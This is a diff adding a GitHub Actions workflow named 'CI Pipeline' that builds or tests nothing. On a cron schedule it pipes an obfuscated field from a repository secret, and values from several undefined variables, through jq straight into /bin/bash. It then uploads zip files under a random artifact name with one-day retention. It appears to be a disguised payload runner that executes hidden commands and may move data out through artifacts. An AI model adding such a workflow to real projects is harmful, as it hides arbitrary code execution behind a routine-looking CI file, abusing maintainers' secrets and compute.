@@ -1,0 +1,29 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          c6: ${{ secrets.c6 }}
+        run: |
+          printf '%s' "$c6" | jq -r .zgya83 | /bin/bash
+          echo $it85 | jq -r .o6254 | /bin/bash
+          echo $eb69 | jq -r .kv18 | /bin/bash
+          echo $lgznn10 | jq -r .ukdd650 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ezQdBNS6
+          path: "*.zip"
+          retention-days: 1
